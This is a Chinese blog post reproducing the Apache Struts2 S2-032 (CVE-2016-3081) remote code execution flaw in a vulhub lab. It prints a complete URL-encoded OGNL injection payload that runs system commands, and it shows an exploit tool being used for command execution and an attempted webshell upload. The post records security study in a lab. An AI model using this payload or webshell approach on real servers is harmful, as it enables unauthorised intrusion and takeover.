# CVE-2016-3081 S2-032 复现 - 美式加糖 - 博客园

> 原文：[`www.cnblogs.com/peace-and-romance/p/15643921.html`](https://www.cnblogs.com/peace-and-romance/p/15643921.html)

### 0X00-引言

* * *

当当当

### 0X01-环境搭建

* * *

靶机：CentOS Linux 7

攻击机：windows server 2016 && Kail

环境：vulhub

项目地址：[`github.com/vulhub/vulhub`](https://github.com/vulhub/vulhub)

搭建 vulhub 请访问：[空白 centos7 64 搭建 vulhub(详细)](https://www.cnblogs.com/peace-and-romance/p/15621658.html)

### 0X02-漏洞描述

* * *

Struts2 在开启了动态方法调用（动态方法调用）的情况下，可以使用`method:<name>`的方式来调用调用`<name>`的方法，而这个方法名将进行 OGNL 表达式计算，导致远程命令执行漏洞。

影响版本：Struts 2.3.20 - Struts Struts 2.3.28（2.3.20.3 和 2.3.24.3 除外）

### 0X03-漏洞复现

* * *

##### 01-任意命令执行

`http://192.168.234.128:8080/index.action?`

payload:

```
method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=whoami 
```

![image-20211205000019176](img/c992084f6fcecc85d01e6ff76cc2aed6.png)

### 0X04-漏洞分析

* * *

略

### 0X05-工具利用

* * *

工具地址：[`github.com/Liqunkit/LiqunKit_`](https://github.com/Liqunkit/LiqunKit_)

##### 01-检测

![image-20211205000147878](img/821efc9350e2115d7a5855059e1d3ba5.png)

##### 02-命令执行

![image-20211205000303049](img/4bb004562ee60b09241c8f6c093c4a6d.png)

##### 03-文件上传

上传冰蝎马

![image-20211205000604940](img/21a8ae1eb013b47f320d8b36e5ad1d86.png)

查看路径

![image-20211205000617328](img/bd36516fd1ab05c56a154c7c612324e0.png)

冰蝎连接-连接失败

![image-20211205003553357](img/060f215a36e08c4f5326e3588712697f.png)

回到 docker 中查看-找不到 shell.jsp 的位置

在 webapp 中也没有 shell.jsp

![image-20211205003713621](img/c68e2be7161539b72682277ed2856665.png)

尝试 PUT 方法上传-PUT 方法不支持

![image-20211205003810211](img/82cf2e995f0e5b1c32cd032f21fb4777.png)

文件上传走不通

### 0X06-查看日志

* * *

```
docker ps #查看容器 ID
docker exec -it ID /bin/bash #进入
cd logs #进入日志目录
cat localhost_access_log.2021-12-02.txt #查看日志
exit #退出容器 
```

未找到 log 文件

![image-20211205004625398](img/dc08284da4c523a6827da3968e5d658b.png)

### 0X07-参考

* * *

[S2-032 远程代码执行漏洞（CVE-2016-3081）](https://github.com/vulhub/vulhub/blob/master/struts2/s2-032/README.zh-cn.md)